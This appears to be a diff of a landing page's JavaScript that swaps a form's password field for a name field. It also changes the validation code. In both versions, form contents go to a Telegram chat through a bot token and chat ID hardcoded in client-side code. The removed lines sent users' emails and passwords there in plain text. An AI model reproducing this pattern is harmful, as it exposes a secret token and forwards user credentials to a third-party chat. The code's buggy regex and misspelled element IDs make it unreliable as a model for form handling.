@@ -85,9 +85,7 @@ $(document).ready(function () {
   var header = document.querySelector('.header');
   var headerStyle = window.getComputedStyle(header);
   var headerHeight = parseFloat(headerStyle.height);
-  console.log(headerHeight);
   var element = document.getElementById('hero').getBoundingClientRect();
-  console.log(element.height);
   var height = element.height - headerHeight; // зміна bg на header при скролінгу сторінки
 
   $(window).scroll(function () {
@@ -127,66 +125,73 @@ $(document).ready(function () {
   });
 }); // Валідація форми
 
-var EMAIL_MIN_LENGHT = 5;
-var mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{8,})");
+var NAME_MIN_LENGTH = 3;
+var emailRegex = new RegExp('[a-z0-9]+@[a-z]+\.[a-z]{2,3}');
 
-function testPasswordRegex(value) {
-  return mediumRegex.test(value);
+function testEmailRegex(value) {
+  return emailRegex.test(value);
 }
 
-function checkEmailLenght() {
-  var valueLenght = window.inputEmail.value.length;
-  var diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;
+function checkNameLenght() {
+  var valueLength = window.inputName.value.length;
+  var diff = valueLength < NAME_MIN_LENGTH ? NAME_MIN_LENGTH - valueLength : 0;
 
   if (diff) {
-    window.emailDiffCount.textContent = diff;
-    window.emailLenghtHelp.classList.remove('d-none');
+    window.nameDiffCount.textContent = diff;
+    window.nameLenghtHelp.classList.remove('d-none');
   } else {
-    window.emailLenghtHelp.classList.add('d-none');
+    window.nameLenghtHelp.classList.add('d-none');
   }
 }
 
 ;
 
 function resetValidation() {
+  window.namelHelp.classList.add('d-none');
   window.emailHelp.classList.add('d-none');
-  window.passwordHelp.classList.add('d-none');
-  window.passwordHelpDescription.classList.add('d-none');
+  window.emailLenghtHelp.classList.add('d-none');
 }
 
 function validateForm(event) {
   event.preventDefault();
   resetValidation();
+  var name = window.inputName.value;
   var email = window.inputEmail.value;
-  var password = window.inputPassword.value;
+  console.log(name);
+  console.log(email);
+
+  if (!name) {
+    window.namelHelp.classList.remove('d-none');
+    return false;
+  }
 
   if (!email) {
     window.emailHelp.classList.remove('d-none');
     return false;
   }
 
-  if (!password) {
-    window.passwordHelp.classList.remove('d-none');
-    return false;
-  }
-
-  if (!testPasswordRegex(password)) {
-    window.passwordHelp.classList.remove('d-none');
-    window.passwordHelpDescription.classList.remove('d-none');
+  if (!testEmailRegex(email)) {
+    window.emailHelp.classList.remove('d-none');
+    window.emailLenghtHelp.classList.remove('d-none');
   }
 }
 
+;
+window.inputName.addEventListener('input', checkNameLenght);
+window.loginForm.addEventListener('submit', validateForm);
+document.addEventListener("DOMContentLoaded", checkNameLenght);
+
 function formSubmit(event) {
-  var email, password, apiToken, chatId, text, urlString, response, resp;
+  var email, userName, apiToken, chatId, text, urlString, response, resp;
   return regeneratorRuntime.async(function formSubmit$(_context) {
     while (1) {
       switch (_context.prev = _context.next) {
         case 0:
           event.preventDefault();
           email = window.inputEmail.value;
-          password = window.inputPassword.value;
+          userName = window.inputName.value;
 
-          if (!(!email || !password)) {
+          if (!(!email || !userName)) {
             _context.next = 5;
             break;
           }
@@ -196,7 +201,7 @@ function formSubmit(event) {
         case 5:
           apiToken = "6412142701:AAFqsqMVnxL0I3awtWVuK4_1i8gHEF-7zl0";
           chatId = "-1001923473956";
-          text = "\n    <b>Email: </b> ".concat(email, "\n    <b>Password </b> ").concat(password, "\n    ");
+          text = "\n    <b>Email: </b> ".concat(email, "\n    <b>userName: </b> ").concat(userName, "\n    ");
           urlString = "https://api.telegram.org/bot".concat(apiToken, "/sendMessage");
           _context.next = 11;
           return regeneratorRuntime.awrap(fetch(urlString, {
@@ -219,11 +224,7 @@ function formSubmit(event) {
 
         case 14:
           resp = _context.sent;
-          console.log(resp); // let request = new XMLHttpRequest();
-          // request.open("GET", urlString);
-          // request.send();
-          // let response = request.response;
-          // Do what you want with response
+          console.log(resp);
 
         case 16:
         case "end":
@@ -231,7 +232,7 @@ function formSubmit(event) {
       }
     }
   });
-} // window.inputEmail.addEventListener('input', checkEmailLenght);
+}
 
-
+console.log();
 window.loginForm.addEventListener('submit', formSubmit);
